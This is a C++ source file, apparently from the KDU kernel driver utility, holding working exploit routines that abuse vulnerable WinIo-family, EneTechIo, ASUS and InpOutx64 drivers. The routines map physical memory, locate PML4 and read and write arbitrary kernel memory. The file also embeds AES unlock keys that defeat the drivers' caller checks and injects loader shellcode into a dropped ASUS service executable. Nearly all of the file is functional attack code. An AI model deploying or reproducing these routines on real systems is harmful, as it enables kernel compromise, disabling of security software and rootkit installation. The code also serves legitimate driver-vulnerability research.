/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2022
*
*  TITLE:       WINIO.CPP
*
*  VERSION:     1.27
*
*  DATE:        11 Nov 2022
*
*  WINIO based drivers routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/winio.h"
#include "ldrsc.h"

#ifdef __cplusplus
extern "C" {
#include "../Shared/tinyaes/aes.h"
}
#endif

//
// AES keys used by EneTechIo latest variants.
//
static ULONG g_EneTechIoUnlockKey[4] = { 0x54454E45, 0x4E484345, 0x474F4C4F, 0x434E4959 };
static ULONG g_EneTechIoUnlockKey2[4] = { 0x9984FD3E, 0x70683A8, 0xBD444418, 0x5E10D83 };

ULONG g_WinIoMapIOCTL;
ULONG g_WinIoUnmapIOCTL;

//
// Generic WINIO interface for all supported drivers based on WINIO code.
//
// MICSYS RGB driver interface for CVE-2019-18845.
// Ptolemy Tech Co., Ltd ENE driver interface
// G.Skill EneIo64 driver interface
// ASUS GPU Tweak driver interface
// ... and multiple others
//

typedef PVOID(WINAPI* pfnWinIoGenericMapMemory)(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* ReferencedObject);

typedef VOID(WINAPI* pfnWinIoGenericUnmapMemory)(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject);

PUCHAR g_pvAESKey;
pfnWinIoGenericMapMemory g_WinIoMapMemoryRoutine;
pfnWinIoGenericUnmapMemory g_WinIoUnmapMemoryRoutine;

BOOL g_PhysAddress64bit = FALSE;
BOOL g_SpecifyOffset = FALSE;

/*
* MsIoMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID MsIoMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* ReferencedObject)
{
    MSIO_PHYSICAL_MEMORY_INFO request;

    *SectionHandle = NULL;
    *ReferencedObject = NULL;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.ViewSize = PhysicalAddress + NumberOfBytes;

    if (supCallDriver(DeviceHandle,
        g_WinIoMapIOCTL,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *SectionHandle = request.SectionHandle;
        *ReferencedObject = request.ReferencedObject;
        return request.BaseAddress;
    }

    return NULL;
}

/*
* MsIoUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID MsIoUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject
)
{
    MSIO_PHYSICAL_MEMORY_INFO request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.BaseAddress = SectionToUnmap;
    request.ReferencedObject = ReferencedObject;
    request.SectionHandle = SectionHandle;

    supCallDriver(DeviceHandle,
        g_WinIoUnmapIOCTL,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* WinIoMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID WinIoMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* ReferencedObject)
{
    WINIO_PHYSICAL_MEMORY_INFO request;

    *SectionHandle = NULL;
    *ReferencedObject = NULL;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.ViewSize = NumberOfBytes;
    request.BusAddress = PhysicalAddress;

    if (supCallDriver(DeviceHandle,
        g_WinIoMapIOCTL,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *SectionHandle = request.SectionHandle;
        *ReferencedObject = request.ReferencedObject;
        return request.BaseAddress;
    }

    return NULL;
}

/*
* WinIoUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID WinIoUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject
)
{
    WINIO_PHYSICAL_MEMORY_INFO request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.BaseAddress = SectionToUnmap;
    request.ReferencedObject = ReferencedObject;
    request.SectionHandle = SectionHandle;

    supCallDriver(DeviceHandle,
        g_WinIoUnmapIOCTL,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* WinIoMapMemory2
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
* EneTechIo latest version variant with requestor check.
*
*/
PVOID WinIoMapMemory2(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* ReferencedObject)
{
    AES_ctx ctx;
    WINIO_PHYSICAL_MEMORY_INFO_EX request;

    *SectionHandle = NULL;
    *ReferencedObject = NULL;

    RtlSecureZeroMemory(&ctx, sizeof(ctx));
    AES_init_ctx(&ctx, (uint8_t*)g_pvAESKey);

    RtlSecureZeroMemory(&request, sizeof(request));
    request.CommitSize = NumberOfBytes;
    request.BusAddress = PhysicalAddress;

    //
    // Debug warning.
    //
    // EneTechIo (A) and EneTechIo (B) implement requestor check based on 
    // timing between key generation and time of check on driver side.
    // It is limited to 2 seconds, thus you should not put any breakpoints 
    // after key is generated and can only do that uppon EneTechIo device call completion.
    //

    ULONG seconds = supGetTimeAsSecondsSince1970();

    RtlCopyMemory(&request.EncryptedKey, (PVOID)&seconds, sizeof(seconds));
    AES_ECB_encrypt(&ctx, (UCHAR*)&request.EncryptedKey);

    if (supCallDriver(DeviceHandle,
        g_WinIoMapIOCTL,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *SectionHandle = request.SectionHandle;
        *ReferencedObject = request.ReferencedObject;
        return request.BaseAddress;
    }

    return NULL;
}

/*
* WinIoUnmapMemory2
*
* Purpose:
*
* Unmap previously mapped physical memory.
* EneTechIo latest version variant with requestor check.
*
*/
VOID WinIoUnmapMemory2(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject
)
{
    AES_ctx ctx;
    WINIO_PHYSICAL_MEMORY_INFO_EX request;

    RtlSecureZeroMemory(&ctx, sizeof(ctx));
    AES_init_ctx(&ctx, (uint8_t*)g_pvAESKey);

    RtlSecureZeroMemory(&request, sizeof(request));
    request.BaseAddress = SectionToUnmap;
    request.ReferencedObject = ReferencedObject;
    request.SectionHandle = SectionHandle;

    //
    // Debug warning.
    //
    // EneTechIo (A) and EneTechIo (B) implement requestor check based on 
    // timing between key generation and time of check on driver side.
    // It is limited to 2 seconds, thus you should not put any breakpoints 
    // after key is generated and can only do that uppon EneTechIo device call completion.
    //

    ULONG seconds = supGetTimeAsSecondsSince1970();

    RtlCopyMemory(&request.EncryptedKey, (PVOID)&seconds, sizeof(ULONG));
    AES_ECB_encrypt(&ctx, (UCHAR*)&request.EncryptedKey);

    supCallDriver(DeviceHandle,
        g_WinIoUnmapIOCTL,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* RedFoxMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID RedFoxMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* ReferencedObject)
{
    WINIO_REDFOX request;
    ULONG_PTR offset;
    ULONG mapSize;

    *SectionHandle = NULL;
    *ReferencedObject = NULL;

    RtlSecureZeroMemory(&request, sizeof(request));

    offset = PhysicalAddress & ~(PAGE_SIZE - 1);
    mapSize = (ULONG)(PhysicalAddress - offset) + NumberOfBytes;

    request.BusAddress = offset;
    request.ViewSize = mapSize;

    if (supCallDriver(DeviceHandle,
        g_WinIoMapIOCTL,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *SectionHandle = request.SectionHandle;
        return request.BaseAddress;
    }

    return NULL;
}

/*
* RedFoxUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID RedFoxUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject
)
{
    WINIO_REDFOX request;

    UNREFERENCED_PARAMETER(ReferencedObject);

    RtlSecureZeroMemory(&request, sizeof(request));
    request.BaseAddress = SectionToUnmap;
    request.SectionHandle = SectionHandle;

    supCallDriver(DeviceHandle,
        g_WinIoUnmapIOCTL,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* WinIoQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI WinIoQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    DWORD cbRead = 0x100000;
    ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;

    PVOID refObject = NULL;
    HANDLE sectionHandle = NULL;

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    pbLowStub1M = (ULONG_PTR)g_WinIoMapMemoryRoutine(DeviceHandle,
        0ULL,
        cbRead,
        &sectionHandle,
        &refObject);

    if (pbLowStub1M) {

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;

        g_WinIoUnmapMemoryRoutine(DeviceHandle,
            (PVOID)pbLowStub1M,
            sectionHandle,
            refObject);
    }

    return (PML4 != 0);
}

/*
* WinIoReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI WinIoReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;
    ULONG_PTR offset;

    PVOID refObject = NULL;
    HANDLE sectionHandle = NULL;

    //
    // Map physical memory section.
    //
    mappedSection = g_WinIoMapMemoryRoutine(DeviceHandle,
        PhysicalAddress,
        NumberOfBytes,
        &sectionHandle,
        &refObject);

    if (mappedSection) {

        if (g_SpecifyOffset)
            offset = PhysicalAddress - (PhysicalAddress & ~(PAGE_SIZE - 1));
        else
            offset = PhysicalAddress;

        __try {

            if (DoWrite) {
                if (g_PhysAddress64bit) {
                    RtlCopyMemory(mappedSection, Buffer, NumberOfBytes);
                }
                else {
                    RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
                }
            }
            else {
                if (g_PhysAddress64bit) {
                    RtlCopyMemory(Buffer, mappedSection, NumberOfBytes);
                }
                else {
                    RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
                }
            }

            bResult = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        //
        // Unmap physical memory section.
        //
        g_WinIoUnmapMemoryRoutine(DeviceHandle,
            mappedSection,
            sectionHandle,
            refObject);

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* WinIoReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI WinIoReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return WinIoReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* WinIoWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI WinIoWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return WinIoReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* WinIoVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI WinIoVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        WinIoQueryPML4Value,
        WinIoReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* WinIoReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI WinIoReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = WinIoVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = WinIoReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

    }

    return bResult;
}

/*
* WinIoWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI WinIoWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = WinIoVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = WinIoReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

    }

    return bResult;
}

/*
* GlckIo2Register
*
* Purpose:
*
* Register in GlckIo2 "trusted" process list.
*
*/
BOOL GlckIo2Register(
    _In_ HANDLE DeviceHandle)
{
    AES_ctx ctx;
    ULONG_PTR encryptedProcessId;
    UCHAR Buffer[16];
    BYTE OutBuf[512];
    ULONG AES128Key[4] = { 0x16157eaa, 0xa6d2ae28, 0x8815f7ab, 0x3c4fcf09 };

    RtlSecureZeroMemory(&ctx, sizeof(ctx));

    AES_init_ctx(&ctx, (uint8_t*)&AES128Key);

    encryptedProcessId = SWAP_UINT32(GetCurrentProcessId());

    RtlSecureZeroMemory(&Buffer, sizeof(Buffer));
    RtlSecureZeroMemory(&OutBuf, sizeof(OutBuf));
    RtlCopyMemory(&Buffer, &encryptedProcessId, sizeof(ULONG_PTR));
    AES_ECB_encrypt(&ctx, (uint8_t*)&Buffer);

    return supCallDriver(DeviceHandle,
        IOCTL_GKCKIO2_REGISTER,
        &Buffer,
        sizeof(Buffer),
        &OutBuf,
        sizeof(OutBuf));
}

/*
* WinIoPreOpen
*
* Purpose:
*
* Pre-open callback for some variants of Ene WinIo drivers.
*
*/
BOOL WINAPI WinIoPreOpen(
    _In_ PVOID Param
)
{
    UNREFERENCED_PARAMETER(Param);
    return supManageDummyDll(DUMMYDLL, FALSE);
}

#define ASUS_LDR_DLL L"u.dll"
#define ASUS_SVC_EXE L"AsusCertService.exe"

/*
* AsusIO3PreOpen
*
* Purpose:
*
* Pre-open callback for AsIO3.
*
*/
BOOL WINAPI AsusIO3PreOpen(
    _In_ PVOID Param
)
{
    BOOL bResult = FALSE;
    DWORD cch;
    ULONG resourceSize = 0;
    KDU_CONTEXT* Context = (PKDU_CONTEXT)Param;
    WCHAR szTemp[MAX_PATH + 1];
    WCHAR szFileName[MAX_PATH * 2];

    RtlSecureZeroMemory(&szTemp, sizeof(szTemp));
    cch = supExpandEnvironmentStrings(L"%temp%", szTemp, MAX_PATH);
    if (cch == 0 || cch > MAX_PATH) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        return FALSE;
    }

    PBYTE dllBuffer, svcBuffer = NULL;

    dllBuffer = (PBYTE)KDULoadResource(IDR_TAIGEI32,
        GetModuleHandle(NULL),
        &resourceSize,
        PROVIDER_RES_KEY,
        TRUE);

    if (dllBuffer == NULL) {

        supPrintfEvent(kduEventError,
            "[!] Failed to load helper dll\r\n");

        return FALSE;

    }

    if (supReplaceDllEntryPoint(dllBuffer,
        resourceSize,
        (LPCSTR)"RegisterForProvider",
        FALSE))
    {

        StringCchPrintf(szFileName, MAX_PATH * 2,
            TEXT("%ws\\%ws"),
            szTemp,
            ASUS_LDR_DLL);

        NTSTATUS ntStatus;

        if (supWriteBufferToFile(szFileName,
            dllBuffer,
            resourceSize,
            TRUE,
            FALSE,
            &ntStatus))
        {
            resourceSize = 0;
            svcBuffer = (PBYTE)KDULoadResource(IDR_DATA_ASUSCERTSERVICE,
                Context->ModuleBase,
                &resourceSize,
                PROVIDER_RES_KEY,
                TRUE);

            if (svcBuffer) {

                StringCchPrintf(szFileName, MAX_PATH * 2,
                    TEXT("%ws\\%ws"),
                    szTemp,
                    ASUS_SVC_EXE);

                if (supWriteBufferToFile(szFileName,
                    svcBuffer,
                    resourceSize,
                    TRUE,
                    FALSE,
                    NULL))
                {
                    HANDLE zombieProcess = NULL;

                    if (NT_SUCCESS(supInjectPayload(svcBuffer,
                        g_KduLoaderShellcode,
                        sizeof(g_KduLoaderShellcode),
                        szFileName,
                        &zombieProcess)))
                    {
                        Sleep(1000);
                        Context->ArbitraryData = (ULONG64)zombieProcess;
                        bResult = TRUE;
                    }
                }

                supHeapFree(svcBuffer);
            }
            else {
                supPrintfEvent(kduEventError, "[!] Failed to load ASUS service resource\r\n");
            }

        }
        else {
            supShowHardError("[!] Error while writing data to disk", ntStatus);
        }

    }
    else {
        supPrintfEvent(kduEventError, "[!] Error while configuring helper dll\r\n");
    }

    supHeapFree(dllBuffer);

    return bResult;
}

/*
* AsusIO3UnregisterDriver
*
* Purpose:
*
* Unregister routine for AsIO3.
*
*/
BOOL WINAPI AsusIO3UnregisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    DWORD cch;
    KDU_CONTEXT* Context = (PKDU_CONTEXT)Param;

    HANDLE zombieProcess;
    WCHAR szTemp[MAX_PATH + 1];

    UNREFERENCED_PARAMETER(DeviceHandle);

    if (Context == NULL)
        return FALSE;

    zombieProcess = (HANDLE)Context->ArbitraryData;

    RtlSecureZeroMemory(&szTemp, sizeof(szTemp));
    cch = supExpandEnvironmentStrings(L"%temp%", szTemp, MAX_PATH);
    if (cch == 0 || cch > MAX_PATH) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        return FALSE;
    }

    if (zombieProcess) {
        TerminateProcess(zombieProcess, ERROR_SUCCESS);
        CloseHandle(zombieProcess);
    }

    supExtractFileToTemp(NULL, 0, szTemp, ASUS_SVC_EXE, TRUE);
    supExtractFileToTemp(NULL, 0, szTemp, ASUS_LDR_DLL, TRUE);

    return TRUE;
}

/*
* WinIoRegisterDriver
*
* Purpose:
*
* Register WinIo driver.
*
*/
BOOL WINAPI WinIoRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    ULONG DriverId = PtrToUlong(Param);

    g_WinIoMapIOCTL = IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY;
    g_WinIoUnmapIOCTL = IOCTL_WINIO_UNMAP_USER_PHYSICAL_MEMORY;

    switch (DriverId) {
    case IDR_GLCKIO2:
        g_WinIoMapMemoryRoutine = WinIoMapMemory;
        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory;
        g_PhysAddress64bit = TRUE;

        if (!GlckIo2Register(DeviceHandle))
            return FALSE;

        break;

    case IDR_MSIO64:
        g_WinIoMapMemoryRoutine = MsIoMapMemory;
        g_WinIoUnmapMemoryRoutine = MsIoUnmapMemory;
        g_PhysAddress64bit = FALSE;
        break;

    case IDR_ENETECHIO64:
        g_WinIoMapMemoryRoutine = WinIoMapMemory2;
        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory2;
        g_pvAESKey = (PUCHAR)g_EneTechIoUnlockKey;
        g_PhysAddress64bit = TRUE;
        break;

    case IDR_ENETECHIO64B:
        g_WinIoMapMemoryRoutine = WinIoMapMemory2;
        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory2;
        g_pvAESKey = (PUCHAR)g_EneTechIoUnlockKey2;
        g_PhysAddress64bit = TRUE;
        break;

    case IDR_ASUSIO2:
    case IDR_ASUSIO3:
        g_WinIoMapMemoryRoutine = WinIoMapMemory;
        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory;
        g_PhysAddress64bit = TRUE;
        g_WinIoMapIOCTL = IOCTL_ASUSIO_MAP_USER_PHYSICAL_MEMORY;
        g_WinIoUnmapIOCTL = IOCTL_ASUSIO_UNMAP_USER_PHYSICAL_MEMORY;
        break;

    case IDR_INPOUTX64:
        g_WinIoMapMemoryRoutine = RedFoxMapMemory;
        g_WinIoUnmapMemoryRoutine = RedFoxUnmapMemory;
        g_WinIoMapIOCTL = IOCTL_REDFOX_MAP_USER_PHYSICAL_MEMORY;
        g_WinIoUnmapIOCTL = IOCTL_REDFOX_UNMAP_USER_PHYSICAL_MEMORY;
        g_SpecifyOffset = TRUE;
        break;

    default:
        g_WinIoMapMemoryRoutine = WinIoMapMemory;
        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory;
        g_PhysAddress64bit = TRUE;
        break;
    }

    return TRUE;
}

/*
* WinIoUnregisterDriver
*
* Purpose:
*
* Unregister routine for some variants of WinIo driver.
*
*/
BOOL WINAPI WinIoUnregisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    KDU_CONTEXT* Context = (KDU_CONTEXT*)Param;

    UNREFERENCED_PARAMETER(DeviceHandle);

    if (Context) {

        if (Context->Provider->LoadData->ResourceId == IDR_ENETECHIO64B) {

            return supManageDummyDll(DUMMYDLL, TRUE);

        }
    }

    return FALSE;
}
